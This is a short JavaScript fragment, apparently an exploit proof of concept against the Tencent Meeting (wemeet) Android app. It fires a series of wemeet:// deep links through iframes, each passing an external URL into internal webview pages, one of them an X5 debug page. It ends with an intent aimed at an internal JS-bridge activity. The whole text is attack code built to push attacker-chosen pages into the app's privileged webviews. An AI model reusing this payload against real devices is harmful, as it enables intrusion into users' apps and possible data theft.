var schemes=[
  'wemeet://page/question_answer?url='+encodeURIComponent(tb),
  'wemeet://page/quick_record/record_webview_page?url='+encodeURIComponent(tb),
  'wemeet://page/rooms_controller/install_helper?url='+encodeURIComponent(tb),

  'wemeet://page/operating_activities/webview_content?url='+encodeURIComponent(tb),

  'wemeet://page/premeeting/schedule_plugin_download?url='+encodeURIComponent(tb),

  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(x5)
];
var i=0;
function fire(){
  if(i>=schemes.length){

    try { location.href='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;end'; } catch(e){}

  }
  var s=schemes[i++];
  document.title='P22L-IFRAME-'+i;
  var f=document.createElement('iframe');
  f.src=s;
  document.body.appendChild(f);
  setTimeout(fire, 2200);
}
